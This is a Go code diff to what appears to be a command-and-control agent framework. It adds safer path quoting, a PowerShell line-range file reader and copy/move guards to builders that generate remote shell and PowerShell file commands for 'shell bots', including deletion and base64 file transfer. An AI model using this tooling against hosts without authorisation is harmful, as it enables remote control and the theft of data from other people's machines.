@@ -5,6 +5,7 @@ import (
 	"encoding/base64"
 	"encoding/hex"
 	"fmt"
+	"path"
 	"regexp"
 	"strconv"
 	"strings"
@@ -12,6 +13,7 @@ import (
 	"unicode/utf8"
 
 	"c2agent/internal/command"
+	"c2agent/internal/limits"
 )
 
 // Execution-environment identifiers for shell bots. The environment is the
@@ -40,6 +42,15 @@ func (t target) psHost() bool { return t.isWindows() && t.env == EnvPowerShell }
 // posixQuote single-quotes a string for POSIX shells.
 func posixQuote(s string) string {
 	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
+}
+
+// posixPath quotes a filesystem path and protects a relative name beginning
+// with '-' from being parsed as an option by commands such as head/tail/rm.
+func posixPath(s string) string {
+	if strings.HasPrefix(s, "-") {
+		s = "./" + s
+	}
+	return posixQuote(s)
 }
 
 // psLiteral single-quotes a string for a PowerShell script. Windows commands
@@ -94,6 +105,10 @@ const (
 	winChunkBegin   = "__C2CHUNK_B__"
 	winChunkEnd     = "__C2CHUNK_E__"
 	winChunkMissing = "__C2CHUNK_M__"
+	// Line-range read framing. RANGE means the requested start line is past
+	// EOF; TOOBIG means the selected bytes exceed the read cap.
+	winRangeMissing = "__C2RANGE_M__"
+	winRangeTooBig  = "__C2RANGE_T__"
 )
 
 // transferChunkSize is the plain-byte chunk size used for segmented upload
@@ -314,6 +329,47 @@ func psWrappedRead(path, begin, end, missing string, maxBytes int) string {
 		"}else{" + psLiteral(missing) + "}"
 }
 
+// psReadLineRange scans the file for byte offsets of lines [start,end] and
+// returns that exact byte range base64-encoded. Scanning is bounded to one
+// read buffer; only the selected range is retained, so a large file does not
+// need to fit in memory. Line terminators are preserved verbatim.
+func psReadLineRange(path string, start, end, maxBytes int) string {
+	p := psLiteral(path)
+	return "if(Test-Path -LiteralPath " + p + " -PathType Leaf){" +
+		"$c2fs=[IO.File]::OpenRead(" + p + ");" +
+		"try{" +
+		"$c2buf=New-Object byte[] 65536;" +
+		"$c2line=0;$c2pos=0;$c2start=-1;$c2end=-1;$c2len=$c2fs.Length;$c2done=$false;" +
+		"while(-not $c2done){" +
+		"$c2n=$c2fs.Read($c2buf,0,$c2buf.Length);" +
+		"if($c2n -le 0){break};" +
+		"for($c2i=0;$c2i -lt $c2n;$c2i++){" +
+		"if($c2line -eq " + strconv.Itoa(start-1) + " -and $c2start -lt 0){$c2start=$c2pos+$c2i};" +
+		"if($c2buf[$c2i] -eq 10){" +
+		"$c2line++;" +
+		"if($c2start -ge 0 -and $c2line -ge " + strconv.Itoa(end) + "){$c2end=$c2pos+$c2i+1;$c2done=$true;break}" +
+		"}" +
+		"};" +
+		"$c2pos += $c2n" +
+		"};" +
+		"if($c2start -lt 0){" + psLiteral(winRangeMissing) + "}" +
+		"else{" +
+		"if($c2end -lt 0){$c2end=$c2len};" +
+		"if(($c2end-$c2start) -gt " + strconv.Itoa(maxBytes) + "){" + psLiteral(winRangeTooBig) + "}" +
+		"else{" +
+		"$c2ml=[int]($c2end-$c2start);" +
+		psLiteral(winReadBegin) + ";" +
+		"$c2fs.Position=$c2start;" +
+		"$c2b=New-Object byte[] $c2ml;" +
+		"$c2r=$c2fs.Read($c2b,0,$c2ml);" +
+		"[Convert]::ToBase64String($c2b,0,$c2r);" +
+		psLiteral(winReadEnd) +
+		"}" +
+		"}" +
+		"}finally{if($c2fs){$c2fs.Close()}}" +
+		"}else{" + psLiteral(winReadMissing) + "}"
+}
+
 // ---------------------------------------------------------------------------
 // Action builders.
 // ---------------------------------------------------------------------------
@@ -329,29 +385,46 @@ func listDirCmd(t target, path string) (string, error) {
 	if t.isWindows() {
 		return t.finish(psListDir(path))
 	}
-	return "ls -la " + posixQuote(path), nil
+	return "ls -la " + posixPath(path), nil
 }
 
-// readFileCmd builds a read_file command. Windows always performs a bounded
-// head read and returns base64; the control end decodes it and, when a line
-// range is requested, slices it (sliceLines) so the exact bytes are preserved
-// (Windows PowerShell's ReadLines/AppendLine would rewrite newlines). POSIX
-// line ranges use `sed` (bounded output); whole-file reads are capped by the
+// clampLineEnd bounds an inclusive, 1-based line range to ReadFileLines.
+func clampLineEnd(start, end int) int {
+	if end == 0 || end < start || end > start+limits.ReadFileLines-1 {
+		return start + limits.ReadFileLines - 1
+	}
+	return end
+}
+
+// readFileCmd builds a read_file command. Windows whole-file reads return a
+// bounded base64 head; Windows line ranges are extracted remotely by byte
+// offset so arbitrary ranges work without loading the file. POSIX line ranges
+// use sed (bounded by the 512-line clamp); whole-file reads are capped by the
 // control end.
 func readFileCmd(t target, path, startLine, endLine string) (string, error) {
 	if t.isWindows() {
-		// Validate the start line as POSIX does; an invalid end_line falls back
-		// to end-of-file (mirroring the native agents).
-		if v := strings.TrimSpace(startLine); v != "" && v != "0" {
-			if _, err := strconv.Atoi(v); err != nil {
-				return "", fmt.Errorf("invalid start_line: %s", v)
+		s := strings.TrimSpace(startLine)
+		if s == "" || s == "0" {
+			return readFileWrappedCmd(t, path, winReadBegin, winReadEnd, winReadMissing, readFileByteCap)
+		}
+		start, err := strconv.Atoi(s)
+		if err != nil || start < 1 {
+			return "", fmt.Errorf("invalid start_line: %s", startLine)
+		}
+		end := 0
+		if e := strings.TrimSpace(endLine); e != "" && e != "0" {
+			if n, err := strconv.Atoi(e); err == nil && n > 0 {
+				end = n
 			}
 		}
-		return readFileWrappedCmd(t, path, winReadBegin, winReadEnd, winReadMissing, readFileByteCap)
+		end = clampLineEnd(start, end)
+		// Base64 expands by 4/3; leave room for the newline and framing lines.
+		maxPlain := limits.MaxOutputBytes*3/4 - 4096
+		return t.finish(psReadLineRange(path, start, end, maxPlain))
 	}
 	start := strings.TrimSpace(startLine)
 	if start == "" || start == "0" {
-		return "head -c " + strconv.Itoa(readFileByteCap) + " " + posixQuote(path), nil
+		return "head -c " + strconv.Itoa(readFileByteCap) + " " + posixPath(path), nil
 	}
 	s, err := strconv.Atoi(start)
 	if err != nil {
@@ -360,28 +433,28 @@ func readFileCmd(t target, path, startLine, endLine string) (string, error) {
 	if s < 1 {
 		s = 1
 	}
-	if strings.TrimSpace(endLine) != "" {
-		e, err := strconv.Atoi(strings.TrimSpace(endLine))
-		if err != nil {
-			return "sed -n '" + strconv.Itoa(s) + ",$p' " + posixQuote(path), nil
+	end := 0
+	if e := strings.TrimSpace(endLine); e != "" && e != "0" {
+		if n, err := strconv.Atoi(e); err == nil && n > 0 {
+			end = n
 		}
-		return "sed -n '" + strconv.Itoa(s) + "," + strconv.Itoa(e) + "p' " + posixQuote(path), nil
 	}
-	return "sed -n '" + strconv.Itoa(s) + ",$p' " + posixQuote(path), nil
+	end = clampLineEnd(s, end)
+	return "sed -n '" + strconv.Itoa(s) + "," + strconv.Itoa(end) + "p' " + posixPath(path), nil
 }
 
 func makeDirCmd(t target, path string) (string, error) {
 	if t.isWindows() {
 		return t.finish(psMakeDir(path))
 	}
-	return "mkdir -p " + posixQuote(path), nil
+	return "mkdir -p " + posixPath(path), nil
 }
 
 func deleteCmd(t target, path string, wantDir bool) (string, error) {
 	if t.isWindows() {
 		return t.finish(psDelete(path, wantDir))
 	}
-	q := posixQuote(path)
+	q := posixPath(path)
 	if wantDir {
 		return "if [ -f " + q + " ]; then echo " + posixQuote("Error: "+path+" is a file") + "; else rm -rf " + q + "; fi", nil
 	}
@@ -399,7 +472,7 @@ func renameCmd(t target, path, newName string) (string, error) {
 	if newName == "" || strings.ContainsAny(newName, `/\`) {
 		return "", fmt.Errorf("new_name must be a bare name without path separators")
 	}
-	return "mv " + posixQuote(path) + " " + posixQuote(posixSibling(path, newName)), nil
+	return "mv " + posixPath(path) + " " + posixPath(posixSibling(path, newName)), nil
 }
 
 // posixSibling joins newName onto path's parent directory (both treated as
@@ -437,25 +510,59 @@ func remoteJoin(dir, name string, t target) string {
 }
 
 func copyCmd(t target, src, dest string) (string, error) {
+	if remotePathInside(src, dest, t) {
+		return "", fmt.Errorf("destination is inside source: %s", dest)
+	}
 	if t.isWindows() {
 		return t.finish(psCopy(src, dest))
 	}
 	// Create the destination's parent first, like the native agents (MkdirAll).
-	return "mkdir -p \"$(dirname " + posixQuote(dest) + ")\"; cp -r " + posixQuote(src) + " " + posixQuote(dest), nil
+	return "mkdir -p \"$(dirname " + posixPath(dest) + ")\"; cp -r " + posixPath(src) + " " + posixPath(dest), nil
 }
 
 func moveCmd(t target, src, dest string) (string, error) {
+	if remotePathInside(src, dest, t) {
+		return "", fmt.Errorf("destination is inside source: %s", dest)
+	}
 	if t.isWindows() {
 		return t.finish(psMove(src, dest))
 	}
-	return "mkdir -p \"$(dirname " + posixQuote(dest) + ")\"; mv " + posixQuote(src) + " " + posixQuote(dest), nil
+	return "mkdir -p \"$(dirname " + posixPath(dest) + ")\"; mv " + posixPath(src) + " " + posixPath(dest), nil
+}
+
+// remotePathInside reports whether child is parent or below it. Paths are
+// normalized with the remote separator rules (Windows is case-insensitive);
+// this is a lexical guard for copy/move, not a filesystem resolution.
+func remotePathInside(parent, child string, t target) bool {
+	p := remotePathKey(parent, t)
+	c := remotePathKey(child, t)
+	if p == "." {
+		if c == "." {
+			return true
+		}
+		return c != ".." && !strings.HasPrefix(c, "../") && !strings.HasPrefix(c, "/") &&
+			!(len(c) >= 2 && c[1] == ':')
+	}
+	if p == "/" {
+		return strings.HasPrefix(c, "/")
+	}
+	return c == p || strings.HasPrefix(c, p+"/")
+}
+
+func remotePathKey(p string, t target) string {
+	p = strings.ReplaceAll(p, "\\", "/")
+	p = path.Clean(p)
+	if t.isWindows() {
+		p = strings.ToLower(p)
+	}
+	return p
 }
 
 func createFileCmd(t target, path string) (string, error) {
 	if t.isWindows() {
 		return t.finish(psCreateFile(path))
 	}
-	q := posixQuote(path)
+	q := posixPath(path)
 	return "mkdir -p \"$(dirname " + q + ")\"; touch " + q, nil
 }
 
@@ -487,7 +594,7 @@ func writeBase64Cmd(t target, destPath, b64 string) (string, error) {
 	if len(b64) > posixCmdLimit {
 		return "", fmt.Errorf("file too large for a shell bot (%d base64 bytes > %d); use a native agent", len(b64), posixCmdLimit)
 	}
-	dest := posixQuote(destPath)
+	dest := posixPath(destPath)
 	b64d := base64DecodeCmd(t.os)
 	// Create the destination's parent first, like the native agents (MkdirAll).
 	prefix := "mkdir -p \"$(dirname " + dest + ")\"; "
@@ -507,7 +614,7 @@ func fileSizeCmd(t target, path string) (string, error) {
 	if t.isWindows() {
 		return t.finish(psFileSize(path))
 	}
-	return "wc -c < " + posixQuote(path), nil
+	return "wc -c < " + posixPath(path), nil
 }
 
 // readChunkCmd returns a command that prints the base64 of `length` bytes at
@@ -518,7 +625,7 @@ func readChunkCmd(t target, path string, offset, length int64) (string, error) {
 		return t.finish(psReadChunk(path, offset, length))
 	}
 	// tail -c +N starts at byte N (1-based); head -c L caps the chunk.
-	return "tail -c +" + strconv.FormatInt(offset+1, 10) + " " + posixQuote(path) +
+	return "tail -c +" + strconv.FormatInt(offset+1, 10) + " " + posixPath(path) +
 		" | head -c " + strconv.FormatInt(length, 10) + " | base64", nil
 }
 
@@ -528,7 +635,7 @@ func truncateCreateCmd(t target, path string) (string, error) {
 	if t.isWindows() {
 		return t.finish(psTruncateCreate(path))
 	}
-	q := posixQuote(path)
+	q := posixPath(path)
 	return "mkdir -p \"$(dirname " + q + ")\"; : > " + q, nil
 }
 
@@ -542,7 +649,7 @@ func appendBase64Cmd(t target, path, b64 string) (string, error) {
 	if len(b64) > posixCmdLimit {
 		return "", fmt.Errorf("chunk too large (%d base64 bytes > %d)", len(b64), posixCmdLimit)
 	}
-	return "printf '%s' '" + b64 + "' | " + base64DecodeCmd(t.os) + " >> " + posixQuote(path), nil
+	return "printf '%s' '" + b64 + "' | " + base64DecodeCmd(t.os) + " >> " + posixPath(path), nil
 }
 
 // removeCmd returns a best-effort command that deletes path (used for temp
@@ -551,7 +658,7 @@ func removeCmd(t target, path string) (string, error) {
 	if t.isWindows() {
 		return t.finish(psRemove(path))
 	}
-	return "rm -f " + posixQuote(path), nil
+	return "rm -f " + posixPath(path), nil
 }
 
 // maxEditBytes is the largest file a shell bot can rewrite in one command: the
@@ -581,8 +688,8 @@ func readFileWrappedCmd(t target, path, begin, end, missing string, maxBytes int
 	if t.isWindows() {
 		return t.finish(psWrappedRead(path, begin, end, missing, maxBytes))
 	}
-	return "if [ -f " + posixQuote(path) + " ] && [ -r " + posixQuote(path) + " ]; then printf '%s\\n' '" + begin +
-		"'; head -c " + strconv.Itoa(maxBytes) + " " + posixQuote(path) +
+	return "if [ -f " + posixPath(path) + " ] && [ -r " + posixPath(path) + " ]; then printf '%s\\n' '" + begin +
+		"'; head -c " + strconv.Itoa(maxBytes) + " " + posixPath(path) +
 		" | base64; printf '%s\\n' '" + end + "'; else printf '%s\\n' '" + missing + "'; fi", nil
 }
 
@@ -714,60 +821,6 @@ func paramString(v any) string { return command.String(v) }
 func isWholeFileRead(params map[string]any) bool {
 	s := paramString(params["start_line"])
 	return strings.TrimSpace(s) == "" || strings.TrimSpace(s) == "0"
-}
-
-// sliceLines returns lines [startLine, endLine] (1-based, endLine<=0 = EOF) of
-// content, preserving each line's original terminator, mirroring the native
-// agents' read_file semantics. It is used for Windows shell reads, whose
-// PowerShell ReadLines/AppendLine would otherwise normalize newlines.
-func sliceLines(content, startLine, endLine string) string {
-	start := 1
-	if v := strings.TrimSpace(startLine); v != "" && v != "0" {
-		n, err := strconv.Atoi(v)
-		if err != nil || n < 1 {
-			return "Invalid start_line: " + startLine
-		}
-		start = n
-	}
-	end := 0
-	if v := strings.TrimSpace(endLine); v != "" && v != "0" {
-		if n, err := strconv.Atoi(v); err == nil && n > 0 {
-			end = n
-		}
-	}
-	var b strings.Builder
-	lineNo := 0
-	reached := false
-	done := false
-	i := 0
-	for i < len(content) {
-		j := strings.IndexByte(content[i:], '\n')
-		if j < 0 {
-			break
-		}
-		line := content[i : i+j+1]
-		i += j + 1
-		lineNo++
-		if lineNo >= start {
-			reached = true
-			if end > 0 && lineNo > end {
-				done = true
-				break
-			}
-			b.WriteString(line)
-		}
-	}
-	if !done && i < len(content) {
-		lineNo++
-		if lineNo >= start && (end == 0 || lineNo <= end) {
-			reached = true
-			b.WriteString(content[i:])
-		}
-	}
-	if !reached {
-		return fmt.Sprintf("Start line %s exceeds file line count (%d)", startLine, lineNo)
-	}
-	return b.String()
 }
 
 // truncateRunes caps s at max characters (Unicode code points), never
